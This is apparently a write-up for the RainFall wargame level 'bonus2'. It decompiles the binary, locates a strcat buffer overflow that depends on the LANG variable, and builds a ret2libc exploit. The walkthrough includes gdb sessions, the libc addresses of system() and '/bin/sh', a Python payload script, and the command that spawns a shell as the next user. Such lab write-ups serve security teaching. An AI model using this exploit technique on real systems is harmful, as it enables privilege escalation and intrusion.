# Walkthrough

The home of bonus2 contains an executable, `bonus2`. We decompile it using dogbolt and notice some interesting functins:

`greetuser()`:
```c
int greetuser(char src)
{
  __int128_t dest; 
  short v3; 
  char v4; 

  switch ( language )
  {
    case 1:
      dest = xmmword_8048717;
      v3 = *((_WORD *)&xmmword_8048717 + 8);
      v4 = *((_BYTE *)&xmmword_8048717 + 18);
      break;
    case 2:
      strcpy((char *)&dest, "Goedemiddag! ");
      break;
    case 0:
      strcpy((char *)&dest, "Hello ");
      break;
  }
  strcat((char *)&dest, &src);
  return puts((const char *)&dest);
}
```
`main()` and `language` being a global variable:
```c
int language;

int main(int argc, const char **argv, const char **envp)
{
  char v4[76];
  char dest[76]; 
  char *v6; 
  int language;

  if ( argc != 3 )
    return 1;
  memset(dest, 0, sizeof(dest)); // Cleans dest memory space
  strncpy(dest, argv[1], 40); // Copies 40 characters from the first argument
  strncpy(&dest[40], argv[2], 32); // Copies 32 characters from the second argument, 40 bytes farther
  v6 = getenv("LANG"); // Retrieves the value in the environment
  if ( v6 )
  {
    if ( !memcmp(v6, "fi", 2u) ) // language set to 1 if 'fi'
    {
      language = 1;
    }
    else if ( !memcmp(v6, "nl", 2u) ) // language set to 2 if 'nl'
    {
      language = 2;
    }
  }
  memcpy(v4, dest, sizeof(v4)); // Copies 76 characters of the 72 maximum characters of dest
  return greetuser(v4[0]);
}
```
From there, we can see that:
- The program looks at the `LANG` environment variable to set the global variable `language`
- Depending on the value of `language`, `greetuser()` changes parts of the string passed as a parameter
- The content passed to `greetuser()` comes from the user
- `greetuser()` uses the dangerous `strcat` function



Fidgeting with the environment values:
```
bonus2@RainFall:~$ env -i LANG="fi" bonus2 salut ca
Hyvää päivää salut
bonus2@RainFall:~$ env -i LANG="nl" bonus2 salut ca
Goedemiddag! salut
bonus2@RainFall:~$ env -i LANG="bla" bonus2 salut ca
Hello salut
```

And the buffer:
```
bonus2@RainFall:~$ env -i LANG="nl" bonus2 $(python -c 'print "A"*64') $(python -c 'print "B"*18')
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB
bonus2@RainFall:~$ env -i LANG="nl" bonus2 $(python -c 'print "A"*64') $(python -c 'print "B"*19')
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBB
Segmentation fault (core dumped)
```

If we don't fill the first 40 characters of the first strncpy, it will put a '\0', that's why we were only seeing  the first word of the input in the previous outputs.
```c
  strncpy(dest, argv[1], 40); // Copies 40 characters from the first argument
  strncpy(&dest[40], argv[2], 32); // Copies 32 characters from the second argument, 40 bytes
```


Let's hack now.
The idea here is to perform a `ret2libc` attack, using the `system()` function with `"/bin/sh"` in argument. 
We can find "/bin/sh" inside of the libc using `find` in gdb:
```
(gdb) info proc map
process 3468
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/user/bonus2/bonus2
	 0x8049000  0x804a000     0x1000        0x0 /home/user/bonus2/bonus2
	0xb7e2b000 0xb7e2c000     0x1000        0x0
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd2000 0xb7fd5000     0x3000        0x0
	0xb7fdb000 0xb7fdd000     0x2000        0x0
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
0xb7f8cc58
1 pattern found.
(gdb) x/s 0xb7f8cc58
0xb7f8cc58:	 "/bin/sh"
```

The `system()` function is located at:
```
(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
0xb7e6b060  __libc_system
0xb7e6b060  system
0xb7f49550  svcerr_systemerr
```

Depending on the language, the padding changes.


Disassemble `main()` and `greetuser()`, break at the return address of `greetuser()` in `main()` , at the address of the call to `strcat()` in `greetuser()` and after `strcat()` in `greetuser()`:
```
(gdb) b *0x0804862b
Breakpoint 1 at 0x804862b
(gdb) b *0x08048517
Breakpoint 2 at 0x8048517
(gdb) b *0x0804851c
Breakpoint 3 at 0x804851c
```

Run the program with 'A's and 'B's:
```
(gdb) r $(python -c 'print "A"*40') $(python -c 'print "B"*18')
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*18')

Breakpoint 1, 0x0804862b in main ()
(gdb) c
Continuing.

Breakpoint 2, 0x08048517 in greetuser ()
```

We see the return address and our 'A's and 'B's:
```
(gdb) x/80x $esp
0xbffff5b0:	0xbffff5c0	0xbffff610	0x00000001	0x00000000
0xbffff5c0:	0x6c6c6548	0x0800206f	0x0000414c	0xb7e5e281
0xbffff5d0:	0xbfffff01	0xb7e338f8	0x00000002	0xb7ec38ee
0xbffff5e0:	0xbffff618	0xbffff660	0x00000000	0xbffff6ac
0xbffff5f0:	0xbffff6c8	0xb7ff26b0	0xbfffff01	0xb7f5d780
0xbffff600:	0xbfffff04	0xb7fff918	0xbffff6c8	0x08048630 <-- Return address
0xbffff610:	0x41414141	0x41414141	0x41414141	0x41414141 <-- A
0xbffff620:	0x41414141	0x41414141	0x41414141	0x41414141 <-- A
0xbffff630:	0x41414141	0x41414141	0x42424242	0x42424242 <-- A and B
0xbffff640:	0x42424242	0x42424242	0x00004242	0x00000000 <-- B
```

We continue onto breakpoint 3, and using the different languages, this code with language "fi" overwrites the return address with 'C's:
```bash
(gdb) r $(python -c 'print "A"*40') $(python -c 'print "B"*18+"C"*4')
```

Now we exploit.

Upon calling system, the stack must look like something like this:

+---------------------------+
| String address for system |
+---------------------------+
| Return address for system |
+---------------------------+

Thus, we pad 18 to smash the stack and overwrite the return address to call `system()`, put 4 characters to make the stack in a good shape and write the address of the "/bin/sh" string in libc.

Generating the payload
```python
binsh_addr = b"\x58\xcc\xf8\xb7" # 0xb7f8cc58
system_addr = b"\x60\xb0\xe6\xb7" # 0xb7e6b060
output = 'B' * 18 + system_addr + "AAAA" + binsh_addr
print(output)
```

```
bonus2@RainFall:~$ env -i LANG="fi" bonus2 $(python -c 'print "A"*40') $(python payload.py)
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB`��AAAAX��
$ whoami
bonus3
```

# Resources
[LiveOverflow ret2libc](https://www.youtube.com/watch?v=m17mV24TgwY)